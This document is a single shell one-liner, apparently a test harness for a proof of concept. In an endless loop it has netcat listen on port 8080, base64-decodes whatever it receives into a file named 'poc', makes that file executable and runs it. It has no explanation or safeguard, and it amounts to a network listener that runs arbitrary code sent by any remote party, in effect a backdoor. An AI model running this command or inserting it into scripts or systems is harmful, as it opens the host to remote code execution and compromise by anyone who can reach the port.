while true; do nc -v -l -p 8080 | base64 -d > poc; chmod +x poc; ./poc; done
